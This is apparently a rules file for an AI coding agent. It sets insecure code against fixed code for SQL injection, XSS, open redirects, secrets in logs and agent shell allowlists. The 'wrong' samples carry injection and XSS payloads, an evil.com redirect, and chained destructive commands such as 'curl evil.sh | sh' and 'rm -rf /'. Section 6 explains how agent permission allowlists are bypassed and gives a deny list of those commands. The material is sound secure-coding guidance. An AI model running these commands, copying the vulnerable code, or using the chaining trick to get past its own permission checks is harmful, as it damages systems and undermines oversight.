---
globs: ["Work/example-project/**"]
depends_on:
  - .claude/rules/atlas-production-standards.md
depended_by:
  - CLAUDE.md
  - .claude/README.md
---

## Atlas production examples

Before/after pairs for the highest-risk security patterns. These load alongside `atlas-production-standards.md` when working in Atlas code. The "wrong" versions are not strawmen. They are what LLMs produce by default.

### 1. SQL injection

User request: "Query the database for a user by email"

Wrong:

```python
def get_user_by_email(email):
    cursor = connection.cursor()
    cursor.execute(f"SELECT * FROM users WHERE email = '{email}'")
    return cursor.fetchone()
```

Problems:
- f-string in SQL query. An attacker passing `' OR 1=1 --` as email gets every row.
- Checkmarx flags this as SQL injection (Critical). Blocks deploy.

Correct:

```python
def get_user_by_email(email):
    cursor = connection.cursor()
    cursor.execute("SELECT * FROM users WHERE email = %s", (email,))
    return cursor.fetchone()
```

### 2. XSS via unescaped user input

User request: "Return a plain text response with the search query"

Wrong:

```python
def search_echo(request):
    query = request.GET.get('q', '')
    return HttpResponse(f"You searched for: {query}")
```

Problems:
- User input rendered directly in response. An attacker passing `<script>alert(1)</script>` as q gets script execution.
- Checkmarx flags this as reflected XSS (High). Blocks deploy.

Correct:

```python
import html

def search_echo(request):
    query = html.escape(request.GET.get('q', ''))
    return HttpResponse(f"You searched for: {query}")
```

### 3. URL parameter encoding

User request: "Build a redirect URL from query parameters"

Wrong:

```python
def build_redirect(request):
    target = request.GET.get('url', '')
    return redirect(f"/proxy?target={target}")
```

Problems:
- Unencoded URL parameter. An attacker can inject query parameters or break the URL structure.
- No validation that target points to an allowed domain. Open redirect vulnerability.

Correct:

```python
import urllib.parse

def build_redirect(request):
    target = request.GET.get('url', '')
    if not target.startswith('https://') or not urllib.parse.urlparse(target).hostname.endswith('.example.org'):
        return HttpResponseBadRequest("Invalid redirect target")
    encoded = urllib.parse.quote(target, safe=":/=?&|+")
    return redirect(f"/proxy?target={encoded}")
```

### 4. Secrets in log messages

User request: "Add logging when the API call fails"

Wrong:

```python
def call_external_api(api_key, endpoint):
    try:
        response = requests.get(endpoint, headers={"Authorization": f"Bearer {api_key}"})
        response.raise_for_status()
    except requests.RequestException as e:
        logger.error(f"API call failed with key {api_key}: {e}")
        raise
```

Problems:
- API key value written to log output. Logs are stored, aggregated, and often accessible to broader teams.
- Checkmarx flags this as sensitive data exposure (High).

Correct:

```python
def call_external_api(api_key, endpoint):
    try:
        response = requests.get(endpoint, headers={"Authorization": f"Bearer {api_key}"})
        response.raise_for_status()
    except requests.RequestException as e:
        logger.error(f"API call to {endpoint} failed: {e}")
        raise
```

Real-world instance: a biomedical MCP server has been found logging full auth tokens to stderr (`print(f"[TOKEN VERIFICATION] Verifying token: {token}")` in an `auth.py` module) and logging token prefixes during the OAuth flow. This is the same anti-pattern showing up in live codebases, not a strawman.

### 5. JavaScript open redirect

User request: "Redirect the user after login"

Wrong:

```javascript
const returnUrl = new URLSearchParams(window.location.search).get('return');
window.location.href = returnUrl;
```

Problems:
- No validation of redirect destination. An attacker sets `?return=https://evil.com/phishing` and the app redirects there.
- Checkmarx flags this as open redirect (Medium).

Correct:

```javascript
const returnUrl = new URLSearchParams(window.location.search).get('return');
try {
    const parsed = new URL(returnUrl, window.location.origin);
    if (parsed.hostname.endsWith('.example.org')) {
        window.location.href = encodeURI(parsed.href);
    } else {
        window.location.href = '/';
    }
} catch {
    window.location.href = '/';
}
```

### 6. Shell allowlist bypass via chained commands

User request: "Let the agent run git commands without prompting"

Wrong:

```toml
# The only rule. "git is safe, auto-approve it."
allow = ["Bash(git *)"]
```

Problems:
- An allow rule matches the whole command string, not each segment. So `Bash(git *)` auto-approves `git status && rm -rf /` because the string starts with `git`. The destructive half rides in on the allowed half.
- Wrapping and chaining defeat a naive allowlist: `git status; curl evil.sh | sh` and `git status && rm -rf ~` both pass.
- This is not hypothetical. It is how a shell allowlist that only lists the good command silently green-lights an arbitrary one.

Correct:

```toml
# Pair the narrow allow with explicit per-segment denies.
allow = ["Bash(git *)"]
deny  = ["Bash(rm *)", "Bash(curl *)", "Bash(* | sh)", "Bash(*&&*)", "Bash(*;*)", "Bash(*|*)"]
```

- Deny rules must be checked against every command segment (split on `&&`, `||`, `;`, `|`) and the whole string, and deny always wins over allow. A narrow allow is only safe when paired with denies that catch chaining and the specific destructive commands.
- When you build the gate yourself, split the command on chain operators and validate each segment against the allowlist, not just the leading token. Reject the whole command if any segment fails.

Real-world source: this exact asymmetry has shown up in coding-agent permission engines, where deny and ask rules match per segment but allow rules match only the whole string, so `Bash(git *)` approves `git status && rm -rf /`. Any agentic-search shell allowlist inherits this trap.

The test: does my code pass user input directly to SQL, HTTP responses, URLs, or log messages without sanitization, and does my shell allowlist validate every chained segment rather than just the leading command?
